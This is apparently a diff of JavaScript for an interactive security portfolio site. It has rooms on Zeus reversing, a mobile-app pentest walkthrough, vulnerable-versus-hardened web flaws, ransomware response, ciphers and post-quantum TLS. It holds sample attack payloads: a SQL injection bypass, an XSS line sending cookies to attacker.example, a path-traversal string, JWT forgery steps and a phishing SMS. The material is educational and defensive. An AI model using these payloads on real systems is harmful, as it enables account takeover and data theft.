+    ['FUN_crc32_table','Builds a 256-entry CRC32 lookup table in a 256-iteration loop. Zeus uses checksums like this to recognise names and data without storing them in plain text.','<span class="c">// the standard CRC32 table loop</span>\nfor (i = 0; i &lt; <span class="k">256</span>; i++) {\n    c = i;\n    for (k = 0; k &lt; 8; k++)\n        c = (c &amp; 1) ? <span class="k">0xEDB88320</span> ^ (c &gt;&gt; 1) : c &gt;&gt; 1;\n    table[i] = c;\n}'],
+    ['FUN_mem_scan','A byte-level memory scanner: it walks memory one byte at a time, looking for a pattern.','<span class="c">// reconstructed, in plain terms</span>\ndo {\n    if (*p == <span class="k">pattern</span>[0] &amp;&amp; match(p)) return p;\n    p++;\n} while (p &lt; end);']
+  ];
+  var list=$('zfns');
+  list.innerHTML='<span class="c">// functions reconstructed from Ghidra</span><br>'+FN.map(function(f,i){return '<button class="fn" aria-pressed="false" data-i="'+i+'">'+f[0]+'()</button>'}).join('');
+  function showFn(i){list.querySelectorAll('.fn').forEach(function(b){b.setAttribute('aria-pressed',+b.dataset.i===i?'true':'false')});
+    $('zfn-out').innerHTML='<span class="g">'+FN[i][0]+'</span><br><span style="font-family:var(--body);font-size:15px;color:#e8e2d6">'+FN[i][1]+'</span><br><br><pre style="margin:0;white-space:pre-wrap">'+FN[i][2]+'</pre>'}
+  list.addEventListener('click',function(e){var b=e.target.closest('.fn');if(b)showFn(+b.dataset.i)});
+  var ts=$('zt-s'), td=$('zt-d');
+  function tab(d){ts.setAttribute('aria-selected',d?'false':'true');td.setAttribute('aria-selected',d?'true':'false');$('zp-s').hidden=d;$('zp-d').hidden=!d;if(d)dyn()}
+  ts.onclick=function(){tab(false)}; td.onclick=function(){tab(true)};
+  function dyn(){
+    clearT('zeus'); var n=0, el=$('regn'), pk=$('pkts'); el.textContent='0'; pk.innerHTML='';
+    if(reduce){el.textContent='18';pk.innerHTML='SSDP · DHCP · ICMP · MDNS';return}
+    keep('zeus',setInterval(function(){n++;el.textContent=n;if(n>=18)clearT('zeus')},90));
+    ['SSDP  239.255.255.250:1900','DHCP  request','ICMP  echo','MDNS  224.0.0.251:5353'].forEach(function(p,i){keep('zeus',setTimeout(function(){pk.insertAdjacentHTML('beforeend',p+'<br>')},400+i*350))});
+  }
+  ON.zeus=function(){setTimeout(function(){$('vt').style.width=(66/69*100)+'%'},300)};
+};
+
+/* ---- ZELTO ---- */
+ROOMS.zelto=function(){
+  var S=[
+   ['RECON','LinkedIn OSINT to find who works at ZELTO, then PhoneInfoga to check that a phone number is a real UAE mobile.',
+    '<div class="apph">Recon</div><div class="row2"><span>ZELTO HR Mobile Services</span><b>14 staff</b></div><div class="row2"><span>HR Coordinator</span><span>found</span></div><div class="term"><span class="c">$ phoneinfoga scan -n +9715XXXXXXXX</span>\ncountry: <span class="g">UAE</span>\nline type: <span class="g">mobile</span>\nvalid: <span class="g">true</span></div>'],
+   ['SMS PHISHING','A fake company text with a link to "the new app". People trust a message that looks internal.',
+    '<div class="apph">Messages</div><div style="font-size:11px;color:#777">ZELTO-HR · now</div><div class="bub">ZELTO HR: Your April payslip is ready. Update the ZELTO app to view it: <a>zelto-hr-update.example/app</a></div>'],
+   ['REVERSING THE APK','Opened in jadx: compiled in debug mode, internal API endpoints hardcoded, and a debug JWT signing key left inside.',
+    '<div class="apph">jadx</div><div class="term"><span class="c">AndroidManifest.xml</span>\nandroid:debuggable=<span class="r">"true"</span>\n\n<span class="c">ApiConfig.java</span>\nBASE = <span class="k">"http://192.168.0.200/api"</span>\nINTERNAL = <span class="r">"/internal/..."</span>\nJWT_DEBUG_KEY = <span class="r">"••••••••"</span></div>'],
+   ['READING THE TRAFFIC','Cleartext HTTP and no certificate pinning, so every request can be read and changed. The API also sends back far more than the app shows: salaries and Emirates IDs.',
+    '<div class="apph">Intercepted</div><div class="term">GET <span class="r">http://</span>…/api/me\n<span class="c">no TLS, no pinning</span>\n\n200 OK\n{ "name": "…",\n  "salary": <span class="r">"…"</span>,\n  "emirates_id": <span class="r">"784-…"</span> }</div>'],
+   ['WALKING THE API','A hidden endpoint allowed directory traversal, and HR documents could be opened by just changing the number in the URL (IDOR).',
+    '<div class="apph">API</div><div class="term">GET …/files?name=<span class="r">../../</span>…\n<span class="g">200 OK</span>  ← outside the folder\n\nGET …/documents/<span class="k">1043</span>\nGET …/documents/<span class="r">1044</span>\n<span class="g">200 OK</span>  ← someone else\'s file</div>'],
+   ['FORGING A TOKEN','JWT algorithm confusion: a token the server accepted even though we made it ourselves, and a role field nobody checked, so "employee" became "admin".',
+    '<div class="apph">JWT</div><div class="term"><span class="c">header</span>\n{"alg":"<span class="k">RS256</span>"} → {"alg":"<span class="r">HS256</span>"}\n<span class="c">payload</span>\n{"role":"<span class="k">employee</span>"} → {"role":"<span class="r">admin</span>"}\n\n<span class="g">accepted ✓</span></div>'],
+   ['THE PRINTER','The link-preview feature fetched any URL we gave it (SSRF). That led to the office printer\'s admin page (CUPS), still on its default password: a foothold that stays.',
+    '<div class="apph">Link preview</div><div class="term">POST …/link-preview\n{"url":"<span class="r">http://printer.internal:631</span>"}\n\n→ CUPS admin\nlogin: <span class="r">default credentials</span>\n<span class="g">persistence ✓</span></div>']
+  ];
+  var i=0, scr=$('zl-screen'), dots=$('zl-dots');
+  dots.innerHTML=S.map(function(){return '<i></i>'}).join('');
+  function go(k){i=Math.max(0,Math.min(S.length-1,k));
+    scr.innerHTML='<div class="sb"><span>9:41</span><span>ZELTO</span><span>▮▮▮</span></div><div class="app">'+S[i][2]+'</div>';
+    $('zl-stage').textContent='STEP '+(i+1)+' OF '+S.length+' · '+S[i][0]; $('zl-text').textContent=S[i][1];
+    dots.querySelectorAll('i').forEach(function(d,k){d.classList.toggle('on',k<=i)});
+    $('zl-prev').disabled=i===0; $('zl-next').textContent=i===S.length-1?'START AGAIN':'NEXT STEP →';
+    if(!reduce&&scr.animate)scr.animate([{opacity:.2},{opacity:1}],{duration:280});
+  }
+  $('zl-next').onclick=function(){go(i===S.length-1?0:i+1)}; $('zl-prev').onclick=function(){go(i-1)};
+  go(0);
+};
+
+/* ---- Lost & Found ---- */
+ROOMS.lostfound=function(){
+  var I=[
+   ['Keys','SQL injection','<svg viewBox="0 0 92 92"><circle cx="30" cy="40" r="16" fill="none" stroke="#c99a2e" stroke-width="7"/><path d="M44 46l36 22M64 58l-6 10M72 63l-5 8" stroke="#c99a2e" stroke-width="7" stroke-linecap="round"/></svg>',
+     ['The login builds its SQL straight from what you type, so a quote and a comment log you in as admin without a password.','<code class="mono">admin\' -- </code>'],
+     ['Prepared statements: the same input is now just text. Wrong credentials fail, and the attempts counter goes down.','']],
+   ['Umbrella','Stored XSS','<svg viewBox="0 0 92 92"><path d="M10 46a36 30 0 0 1 72 0z" fill="#7a2f2a"/><path d="M46 46v30a8 8 0 0 1-16 0" stroke="#3b2a1c" stroke-width="5" fill="none" stroke-linecap="round"/></svg>',
+     ['A script saved in an item\'s description runs in every visitor\'s browser and sends their session cookie to the attacker.','<code class="mono">&lt;script&gt;new Image().src=\'//attacker.example/?c=\'+document.cookie&lt;/script&gt;</code>'],
+     ['htmlspecialchars() on everything the page prints: the script shows up as harmless text. Burp AI\'s harder payloads came back encoded too.','']],
+   ['Notebook','Brute force','<svg viewBox="0 0 92 92"><rect x="22" y="14" width="48" height="64" rx="3" fill="#2c3f73"/><path d="M30 14v64" stroke="#1d2a4f" stroke-width="4"/><path d="M38 30h24M38 40h24M38 50h16" stroke="#efe4cb" stroke-width="3"/></svg>',
+     ['No rate limit and no lockout: Burp Intruder can try passwords as fast as it likes.','<code class="mono">admin / 123456 ✗  admin / password ✗  admin / …</code>'],
+     ['Failed attempts are counted, and after the limit the login locks for a while.','']],
+   ['Backpack','Local file inclusion','<svg viewBox="0 0 92 92"><path d="M24 30a22 22 0 0 1 44 0v42H24z" fill="#3e6b3a"/><rect x="32" y="48" width="28" height="16" rx="3" fill="#2f5230"/><path d="M36 30a10 10 0 0 1 20 0" stroke="#2f5230" stroke-width="4" fill="none"/></svg>',
+     ['The page router includes whatever file name it is given, so it can be pointed at files outside the site.','<code class="mono">index.php?page=../../../../windows/win.ini</code>'],
+     ['Unknown pages return 404, and user input never reaches include() directly.','']],
+   ['Scarf','IDOR','<svg viewBox="0 0 92 92"><path d="M18 30c18-10 38-10 56 0l-6 12c-14-6-30-6-44 0z" fill="#c99a2e"/><path d="M58 40l4 36h-10l-4-34zM46 40l-2 34h-10l4-32z" fill="#a37a22"/></svg>',
+     ['Items are fetched by an ID in the URL with no access check, so changing the number shows a private item that isn\'t yours.','<code class="mono">view.php?id=1</code>'],
+     ['An authorization check on every item: someone else\'s private item now says "Item not found".','']]
+  ];
+  var hard=false, sel=-1, shelf=$('lf-shelf'), card=$('lf-card'), room=$('r-lostfound');
+  shelf.innerHTML=I.map(function(it,i){return '<button class="item" aria-pressed="false" data-i="'+i+'" aria-label="'+it[0]+': '+it[1]+'">'+it[2]+'<span class="tagp">'+it[1]+'</span></button>'}).join('');
+  function draw(){
+    if(sel<0)return; var it=I[sel], side=hard?it[4]:it[3];
+    card.innerHTML='<h3>'+it[1]+' <span style="font-size:.85rem;font-family:var(--display);letter-spacing:.12em;color:'+(hard?'#3e6b3a':'#7a2f2a')+'">· '+(hard?'HARDENED':'VULNERABLE')+'</span></h3><p>'+side[0]+'</p>'+(side[1]?'<p style="margin-top:8px;word-break:break-all">'+side[1]+'</p>':'');
+  }
+  shelf.addEventListener('click',function(e){var b=e.target.closest('.item');if(!b)return;sel=+b.dataset.i;
+    shelf.querySelectorAll('.item').forEach(function(x){x.setAttribute('aria-pressed',x===b?'true':'false')});draw()});
+  $('lf-sw').onclick=function(){hard=!hard;this.setAttribute('aria-checked',hard?'true':'false');$('lf-swl').textContent=hard?'HARDENED VERSION':'VULNERABLE VERSION';room.classList.toggle('hard',hard);room.style.setProperty('--rbg',hard?'#1c2420':'#2a1a1a');draw()};
+};
+
+/* ---- Ransomware ---- */
+ROOMS.ransom=function(){
+  var racks=$('rs-racks'); racks.innerHTML=new Array(11).join('<div class="rack"></div>');
+  var rk=racks.querySelectorAll('.rack'), ENC=[0,1,3,4,6,8];
+  var T=[[0,'T+0','SIEM and EDR alerts fire on mass file changes and lateral movement.'],[0,'T+5m','The EDR\'s forensic storyline confirms ransomware.'],[4,'T+4h','Thirty days of SIEM, VPN, firewall and DNS logs go under analysis; deep packet inspection goes on.'],[24,'T+24h','Domain controllers are reimaged.'],[48,'T+48h','Restoration in dependency order: DNS, Active Directory, databases, core banking.'],[48,'T+48h','Every password, API key, certificate and token is rotated.'],[72,'T+72h','Regulators notified as each law requires: GDPR, DFSA, MAS TRM, PCI-DSS.']];
+  var tl=$('rs-tl'); tl.innerHTML=T.map(function(t){return '<li><b>'+t[1]+'</b><span>'+t[2]+'</span></li>'}).join('');
+  var map=$('rs-map');
+  map.innerHTML='<g stroke="#ffffff10" fill="none"><path d="M0 65H520M0 130H520M0 195H520"/><path d="M130 0V260M260 0V260M390 0V260"/></g>'+
+    '<path id="rs-line" d="M300 160Q200 60 120 70" stroke="#f1b75a" stroke-width="3" fill="none" stroke-dasharray="8 8" opacity="0"/>'+
+    '<g font-family="Marcellus SC,serif" font-size="13" letter-spacing="1.5"><circle cx="120" cy="70" r="9" fill="#f1b75a"/><text x="120" y="50" text-anchor="middle" fill="#ece3cf">LONDON</text><text x="120" y="100" text-anchor="middle" fill="#b9ad95" font-size="11">TIER 1 RECOVERY</text>'+
+    '<circle id="rs-dxb" cx="300" cy="160" r="9" fill="#c0463c"/><text x="300" y="140" text-anchor="middle" fill="#ece3cf">DUBAI</text><text x="300" y="190" text-anchor="middle" fill="#e9897f" font-size="11" id="rs-dxbt">DATA CENTER HIT</text>'+
+    '<circle cx="440" cy="200" r="9" fill="#7fb3c9" opacity=".6"/><text x="440" y="180" text-anchor="middle" fill="#ece3cf">SINGAPORE</text><text x="440" y="232" text-anchor="middle" fill="#b9ad95" font-size="11">50% CAPACITY</text></g>';
+  var sl=$('rs-t');
+  function upd(){var h=+sl.value;$('rs-h').textContent='T+'+h+'h';
+    tl.querySelectorAll('li').forEach(function(li,i){li.classList.toggle('on',T[i][0]<=h)});
+    var healed=h<48?0:Math.round((h-48)/24*ENC.length);
+    rk.forEach(function(r,i){var e=ENC.indexOf(i);r.className='rack'+(e>-1?(e<healed?' ok':' enc'):'')});
+    $('rs-line').setAttribute('opacity',h>=24?'1':'0');
+    $('rs-dxbt').textContent=h>=48?'RESTORING':'DATA CENTER HIT';
+  }
+  sl.oninput=upd; upd();
+  var F1={y:'Breach notifications go out under GDPR, DFSA, MAS TRM and PCI-DSS. The double-extortion protocol starts: leadership decides the ransom stance, customers get a confirmed-breach notice, and the cyber insurance claim is triggered.',
+          n:'Containment and eradication carry on as normal, but a precautionary GDPR notice still goes in: 21 days inside means theft can\'t be ruled out. Monitoring for exfiltration continues.'};
+  var F2={y:'Clean means it matches the known-good state from over 30 days ago: no new persistence, accounts identical to before the breach, no attacker tools. Restoration can start.',
+          n:'Go back further and re-verify older recovery points. Every candidate backup is mounted in isolation, scanned with YARA rules built from this attack, compared with a backup 40+ days old, and checked for new scheduled tasks, services and run keys.'};
+  function seg(id,txt,out){var el=$(id);el.addEventListener('click',function(e){var b=e.target.closest('button');if(!b)return;el.querySelectorAll('button').forEach(function(x){x.setAttribute('aria-pressed',x===b?'true':'false')});$(out).textContent=txt[b.dataset.v]})}
+  seg('f1',F1,'f1t'); seg('f2',F2,'f2t');
+};
+
+/* ---- Cipher ---- */
+ROOMS.cipher=function(){
+  var L='ABCDEFGHIJKLMNOPQRSTUVWXYZ', svg=$('wheel'), shift=3;
+  var o='<circle r="152" fill="#8a6a2c"/><circle r="148" fill="#c99a2e"/><circle r="112" fill="#8a6a2c"/>';
+  for(var i=0;i<26;i++){var a=i/26*Math.PI*2-Math.PI/2;o+='<text x="'+(Math.cos(a)*130).toFixed(1)+'" y="'+(Math.sin(a)*130+6).toFixed(1)+'" text-anchor="middle" font-family="Marcellus SC,serif" font-size="17" fill="#2b2117">'+L[i]+'</text>'}
+  o+='<g class="inner" id="wh-in"><circle r="108" fill="#2b2117"/><circle r="104" fill="#d9a441"/>';
+  for(i=0;i<26;i++){a=i/26*Math.PI*2-Math.PI/2;o+='<text x="'+(Math.cos(a)*88).toFixed(1)+'" y="'+(Math.sin(a)*88+6).toFixed(1)+'" text-anchor="middle" font-family="Marcellus SC,serif" font-size="16" fill="#4a2a10">'+L[i]+'</text>'}
+  o+='<path d="M0-60l7 14h-14z" fill="#2b2117"/></g><circle r="44" fill="#8a6a2c"/><text y="9" text-anchor="middle" font-family="Aref Ruqaa,serif" font-size="26" fill="#2b2117">زين</text>';
+  o+='<path d="M0-152v40" stroke="#6b2f2a" stroke-width="3"/>';
+  svg.innerHTML=o;
+  var inner=$('wh-in');
+  function set(n){shift=((n%26)+26)%26;inner.style.transform='rotate('+(-shift*360/26)+'deg)';$('wh-n').textContent='shift '+shift+' · A→'+L[shift]}
+  $('wh-l').onclick=function(){set(shift-1)}; $('wh-r').onclick=function(){set(shift+1)};
+  var drag=null;
+  svg.addEventListener('pointerdown',function(e){drag=angle(e);svg.setPointerCapture(e.pointerId)});
+  svg.addEventListener('pointermove',function(e){if(drag===null)return;var a=angle(e),d=a-drag;if(Math.abs(d)>360/26){var steps=Math.round(d/(360/26));set(shift-steps);drag=a}});
+  svg.addEventListener('pointerup',function(){drag=null});
+  function angle(e){var r=svg.getBoundingClientRect();return Math.atan2(e.clientY-(r.top+r.height/2),e.clientX-(r.left+r.width/2))*180/Math.PI}
+  set(3);
+  var inp=$('ci-in'), out=$('ci-out');
+  function split(){
+    var t=inp.value.toUpperCase().replace(/[^A-Z]/g,''), p=0, k=0, sub=0, h='';
+    while(p<t.length){var c=k%2===0,n=c?6:8,blk=t.substr(p,n);
+      if(c)h+='<span class="blk c"><span>'+blk+'</span><small>CAESAR</small></span>';
+      else{h+='<span class="blk s"><span>'+blk+'</span><small>SUB · <b>TABLE '+(Math.floor(sub/3)+1)+'</b></small></span>';sub++}
+      p+=n;k++}
+    out.innerHTML=h||'<span class="later">Letters only; spaces are dropped.</span>';
+  }
+  inp.addEventListener('input',split); split();
+};
+
+/* ---- QuantumSOC ---- */
+ROOMS.qsoc=function(){
+  var mode='c', hs=$('qs-hs'), bars=$('qs-bars');
+  var D=[['client key share',32,1184,'X25519','ML-KEM-768 key'],['server key share',32,1088,'X25519','ML-KEM-768 ciphertext'],['certificate key',65,1952,'ECDSA P-256','ML-DSA-65'],['signature',64,3309,'ECDSA P-256','ML-DSA-65']];
+  bars.innerHTML=D.map(function(d){return '<div class="bar"><span>'+d[0]+'</span><i></i><output></output></div>'}).join('');
+  function drawBars(){bars.querySelectorAll('.bar').forEach(function(b,i){var v=mode==='c'?D[i][1]:D[i][2];b.classList.toggle('pq',mode==='q');b.querySelector('i').style.width=(v/3309*100)+'%';b.querySelector('output').textContent=v+' B'})}
+  function drawHs(){
+    var pq=mode==='q', M=[['ClientHello · key share',pq?1184:32,60],['ServerHello · key share',pq?1088:32,110],['Certificate · signature',pq?1952+3309:129,160]];
+    var o='<g font-family="IBM Plex Mono,monospace" font-size="12" fill="#cfe3d0"><rect x="10" y="20" width="90" height="160" rx="6" fill="#131b28" stroke="#2f7f7a"/><text x="55" y="105" text-anchor="middle">client</text><rect x="420" y="20" width="90" height="160" rx="6" fill="#131b28" stroke="#2f7f7a"/><text x="465" y="105" text-anchor="middle">server</text></g>';
+    M.forEach(function(m,i){var w=Math.max(14,Math.min(120,Math.log2(m[1])*11)),left=i===0;var x0=left?110:410-w,y=m[2];
+      o+='<path d="M110 '+(y+8)+'H410" stroke="#2f7f7a55" stroke-dasharray="3 5"/>';
+      o+='<g class="msg" style="transform:translateX(0)" data-d="'+(left?1:-1)+'"><rect x="'+x0+'" y="'+y+'" width="'+w+'" height="16" rx="2" fill="'+(pq?'#f1b75a':'#2f7f7a')+'"/></g>';
+      o+='<text x="260" y="'+(y-4)+'" text-anchor="middle" font-family="IBM Plex Mono,monospace" font-size="11" fill="#9fb3c8">'+m[0]+' · '+m[1]+' B</text>'});
+    hs.innerHTML=o;
+    if(!reduce)setTimeout(function(){hs.querySelectorAll('.msg').forEach(function(g,i){var d=+g.dataset.d;g.style.transitionDelay=(i*.5)+'s';g.style.transform='translateX('+(d*(300-0))+'px)'})},60);
+  }
+  $('qs-mode').addEventListener('click',function(e){var b=e.target.closest('button');if(!b)return;mode=b.dataset.v;this.querySelectorAll('button').forEach(function(x){x.setAttribute('aria-pressed',x===b?'true':'false')});drawBars();drawHs()});
+  drawBars(); drawHs();
+  var g=$('qs-gauge');
+  g.innerHTML='<path d="M20 100a80 80 0 0 1 160 0" stroke="#1d2a3a" stroke-width="16" fill="none"/><path d="M20 100a80 80 0 0 1 160 0" stroke="url(#gg)" stroke-width="16" fill="none" stroke-dasharray="40 300"/><defs><linearGradient id="gg"><stop offset="0" stop-color="#c0463c"/><stop offset="1" stop-color="#f1b75a"/></linearGradient></defs><g id="needle" style="transform-origin:100px 100px;transition:transform 2.4s ease-in-out"><path d="M100 100L40 92" stroke="#ece3cf" stroke-width="3" stroke-linecap="round"/></g><circle cx="100" cy="100" r="6" fill="#ece3cf"/><text x="100" y="80" text-anchor="middle" font-family="Marcellus SC,serif" font-size="12" fill="#9fb3c8" letter-spacing="2">IN PROGRESS</text>';
+  var feed=$('qs-feed');
+  function line(){var pq=Math.random()<.5,big=pq&&Math.random()<.3,t=new Date().toISOString().slice(11,19);
+    var s=t+' host=testbed sourcetype=tls tls.version=1.3 group='+(pq?'MLKEM768':'x25519')+' sig='+(pq?'mldsa65':'ecdsa_secp256r1')+' hs_bytes='+(pq?6500+Math.floor(Math.random()*900):900+Math.floor(Math.random()*400))+(big?' <span class="hi">alert=oversized_handshake</span>':'');
+    feed.insertAdjacentHTML('afterbegin','<div>'+s+'</div>'); while(feed.children.length>14)feed.lastChild.remove()}
+  ON.qsoc=function(){clearT('qsoc');for(var i=0;i<6;i++)line();if(!reduce){keep('qsoc',setInterval(line,1100));var a=0;keep('qsoc',setInterval(function(){a=a?0:1;var n=$('needle');n&&(n.style.transform='rotate('+(a?38:12)+'deg)')},2500))}};
+  OFF.qsoc=function(){clearT('qsoc')};
+};
+
+/* ---- Cyberus ---- */
+ROOMS.cyberus=function(){
+  var svg=$('cy-loop');
+  svg.innerHTML='<defs><marker id="ar" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0L10 5 0 10z" fill="#a8977a"/></marker></defs>'+
+   '<g font-family="Marcellus SC,serif" font-size="14" letter-spacing="1.5" text-anchor="middle">'+
+   '<circle cx="90" cy="150" r="58" fill="#1e2230" stroke="#7fb3c9" stroke-width="2"/><text x="90" y="146" fill="#ece3cf">GENERATE</text><text x="90" y="166" fill="#9fb3c8" font-size="11">THE AI COACH</text>'+
+   '<circle cx="270" cy="150" r="58" fill="#1e2230" stroke="#f1b75a" stroke-width="2"/><text x="270" y="146" fill="#ece3cf">VALIDATE</text><text x="270" y="166" fill="#9fb3c8" font-size="11">CHECKED FIRST</text>'+
+   '<circle cx="440" cy="150" r="58" fill="#1e2230" stroke="#7fbf7a" stroke-width="2"/><text x="440" y="146" fill="#ece3cf">LEARNER</text><text x="440" y="166" fill="#9fb3c8" font-size="11">SEES IT</text></g>'+
+   '<path d="M150 150h58" stroke="#a8977a" stroke-width="2" marker-end="url(#ar)"/><path d="M330 150h50" stroke="#a8977a" stroke-width="2" marker-end="url(#ar)"/>'+
+   '<path d="M250 95C220 40 120 40 100 88" stroke="#c0463c" stroke-width="2" fill="none" stroke-dasharray="5 5" marker-end="url(#ar)"/><text x="175" y="40" text-anchor="middle" font-family="Marcellus SC,serif" font-size="12" fill="#e9897f" letter-spacing="1.5">FAILS? RETRY</text>'+
+   '<text x="355" y="138" text-anchor="middle" font-family="Marcellus SC,serif" font-size="11" fill="#9bd496">PASSES</text>'+
+   '<circle id="cy-dot" cx="90" cy="150" r="9" fill="#f1b75a"/><text id="cy-msg" x="260" y="260" text-anchor="middle" font-family="IBM Plex Mono,monospace" font-size="13" fill="#cfe3d0"></text>';
+  var dot=$('cy-dot'), msg=$('cy-msg'), busy=false;
+  function mv(x,y,t,cb){if(reduce){dot.setAttribute('cx',x);dot.setAttribute('cy',y);cb&&cb();return}
+    var x0=+dot.getAttribute('cx'),y0=+dot.getAttribute('cy'),s=performance.now();
+    (function f(n){var k=Math.min(1,(n-s)/t);dot.setAttribute('cx',x0+(x-x0)*k);dot.setAttribute('cy',y0+(y-y0)*k);if(k<1)requestAnimationFrame(f);else cb&&cb()})(s)}
+  $('cy-run').onclick=function(){if(busy)return;busy=true;dot.setAttribute('cx',90);dot.setAttribute('cy',150);
+    msg.textContent='writing a phishing scenario…';
+    mv(270,150,700,function(){msg.textContent='check failed: link missing → retry';dot.setAttribute('fill','#c0463c');
+      mv(175,60,500,function(){mv(90,150,500,function(){dot.setAttribute('fill','#f1b75a');msg.textContent='writing it again…';
+        mv(270,150,700,function(){msg.textContent='check passed';dot.setAttribute('fill','#7fbf7a');
+          mv(440,150,700,function(){msg.textContent='shown to the learner';busy=false})})})})})};
+  var found={}, mail=$('cy-mail'), why={'URGENT: your account will be deleted today':'urgency','Dear user':'a generic greeting','link':'a link that isn\'t the real site','sender':'a look-alike domain (a zero for the o)'};
+  mail.addEventListener('click',function(e){var b=e.target.closest('.flag');if(!b)return;var f=b.dataset.f;
+    mail.querySelectorAll('.flag[data-f="'+f+'"]').forEach(function(x){x.classList.add('on')});found[f]=1;
+    var n=Object.keys(found).length;$('cy-found').textContent=n+' / 4 found · '+why[f]+(n===4?' · that\'s all four':'')});
+};
+
+/* ---- Kitchen ---- */
+ROOMS.kitchen=function(){
+  var svg=$('kitchen');
+  var tiles='';for(var x=0;x<640;x+=32)for(var y=60;y<220;y+=32)tiles+='<rect x="'+x+'" y="'+y+'" width="32" height="32" fill="url(#ktile)"/>';
+  var ck='';for(var i=0;i<8;i++){var cx=228+(i%4)*46,cy=286+Math.floor(i/4)*30;ck+='<g class="cookie" data-i="'+i+'"><ellipse cx="'+cx+'" cy="'+cy+'" rx="17" ry="10" fill="#d9a46a"/><path d="M'+(cx-10)+' '+cy+'h20M'+cx+' '+(cy-6)+'v12M'+(cx-7)+' '+(cy-4)+'l14 8M'+(cx+7)+' '+(cy-4)+'l-14 8" stroke="#a8763c" stroke-width="1.5"/></g>'}
+  svg.innerHTML='<defs><pattern id="ktile" width="32" height="32" patternUnits="userSpaceOnUse"><rect width="32" height="32" fill="#e9dcc0"/><path d="M16 3l13 13-13 13L3 16z" fill="#2f7f7a"/><circle cx="16" cy="16" r="4" fill="#b35a3c"/></pattern></defs>'+
+   '<rect width="640" height="420" fill="#2e2219"/>'+tiles+'<rect y="220" width="640" height="200" fill="#5a3f27"/><rect y="214" width="640" height="12" fill="#3b2a1c"/>'+
+   '<rect x="180" y="236" width="280" height="170" rx="8" fill="#1a1612" stroke="#0e0b09" stroke-width="4"/><rect x="200" y="256" width="240" height="88" fill="#3b1f10"/><rect x="200" y="256" width="240" height="88" fill="#f1b75a" opacity=".22" class="glow"/>'+
+   '<rect x="206" y="300" width="228" height="8" fill="#6b6b70"/>'+ck+
+   '<g class="oven-door" id="oven-door"><rect x="196" y="252" width="248" height="96" rx="4" fill="#2a2420" stroke="#0e0b09" stroke-width="3"/><rect x="214" y="266" width="212" height="60" rx="3" fill="#120d0a"/><rect x="214" y="266" width="212" height="60" fill="#f1b75a" opacity=".2"/><rect x="250" y="256" width="140" height="6" rx="3" fill="#a8977a"/></g>'+
+   '<g fill="#a8977a"><circle cx="230" cy="372" r="9"/><circle cx="270" cy="372" r="9"/><circle cx="370" cy="372" r="9"/><circle cx="410" cy="372" r="9"/></g>'+
+   '<g class="steam"><path d="M260 236c-8-14 8-22 0-36" stroke="#ece3cf" stroke-width="3" fill="none"/><path d="M320 236c-8-14 8-22 0-36" stroke="#ece3cf" stroke-width="3" fill="none"/><path d="M380 236c-8-14 8-22 0-36" stroke="#ece3cf" stroke-width="3" fill="none"/></g>'+
+   '<rect x="40" y="150" width="90" height="70" fill="#3b2a1c"/><text x="85" y="192" text-anchor="middle" font-family="Aref Ruqaa,serif" font-size="22" fill="#f1b75a">معمول</text>';
+  var open=false, n=0;
+  $('k-open').onclick=function(){open=!open;svg.classList.toggle('open',open);this.textContent=open?'CLOSE THE OVEN':'OPEN THE OVEN';$('k-open').blur()};
+  svg.addEventListener('click',function(e){var c=e.target.closest('.cookie');if(!c||!open||c.classList.contains('taken'))return;c.classList.add('taken');n++;$('k-n').textContent=n+' ma\'amoul taken'+(n===8?' · the tray is empty':'')});
+};
+
+/* ---- Rooftop: one qubit on a Bloch sphere ---- */
+ROOMS.roof=function(){
+  var svg=$('bloch'), Rr=130, v=[0,0,1], anim=null;
+  function P(x,y,z){return [Rr*(y*.94-x*.42),Rr*(-z*.94+x*.26)]}
+  var o='<circle r="'+Rr+'" fill="#1a2140" stroke="#7fb3c9" stroke-width="1.5" opacity=".9"/>';
+  var eq='';for(var i=0;i<=64;i++){var a=i/64*Math.PI*2,p=P(Math.cos(a),Math.sin(a),0);eq+=(i?'L':'M')+p[0].toFixed(1)+' '+p[1].toFixed(1)}
+  o+='<path d="'+eq+'" stroke="#7fb3c9" stroke-dasharray="4 4" fill="none" opacity=".7"/>';
+  var ax=[[0,0,1,'|0⟩'],[0,0,-1,'|1⟩'],[1,0,0,'|+⟩'],[0,1,0,'|+i⟩']];
+  ax.forEach(function(a){var p=P(a[0],a[1],a[2]);o+='<path d="M0 0L'+p[0].toFixed(1)+' '+p[1].toFixed(1)+'" stroke="#4a5a80" stroke-width="1"/><text x="'+(p[0]*1.15).toFixed(1)+'" y="'+(p[1]*1.15+5).toFixed(1)+'" text-anchor="middle" font-family="IBM Plex Mono,monospace" font-size="13" fill="#ece3cf">'+a[3]+'</text>'});
+  o+='<line id="bv" x1="0" y1="0" stroke="#f1b75a" stroke-width="4" stroke-linecap="round"/><circle id="bt" r="7" fill="#f1b75a"/><circle r="4" fill="#ece3cf"/>';
+  svg.innerHTML=o;
+  function draw(){var p=P(v[0],v[1],v[2]);$('bv').setAttribute('x2',p[0]);$('bv').setAttribute('y2',p[1]);$('bt').setAttribute('cx',p[0]);$('bt').setAttribute('cy',p[1]);
+    var th=Math.acos(Math.max(-1,Math.min(1,v[2]))),ph=Math.atan2(v[1],v[0]),a=Math.cos(th/2),b=Math.sin(th/2),p0=(1+v[2])/2;
+    var phs=Math.abs(b)<1e-6?'':(Math.abs(ph)<1e-6?'+ ':'+ e^(i·'+(ph/Math.PI).toFixed(2)+'π)·');
+    $('q-state').textContent='|ψ⟩ = '+a.toFixed(2)+'|0⟩ '+(Math.abs(b)<1e-6?'':phs+b.toFixed(2)+'|1⟩')+'   ·   P(0) = '+(p0*100).toFixed(0)+'%'}
+  function to(nv){cancelAnimationFrame(anim);if(reduce){v=nv;draw();return}var s=v.slice(),t0=performance.now();
+    (function f(t){var k=Math.min(1,(t-t0)/500),e=k<.5?2*k*k:1-Math.pow(-2*k+2,2)/2;var x=s[0]+(nv[0]-s[0])*e,y=s[1]+(nv[1]-s[1])*e,z=s[2]+(nv[2]-s[2])*e,n=Math.hypot(x,y,z)||1;v=[x/n,y/n,z/n];draw();if(k<1)anim=requestAnimationFrame(f);else{v=nv;draw()}})(t0)}
+  document.querySelectorAll('#r-roof [data-g]').forEach(function(b){b.onclick=function(){var g=b.dataset.g,x=v[0],y=v[1],z=v[2];
+    if(g==='X')to([x,-y,-z]);else if(g==='Z')to([-x,-y,z]);else if(g==='H')to([z,-y,x]);else if(g==='R')to([0,0,1]);
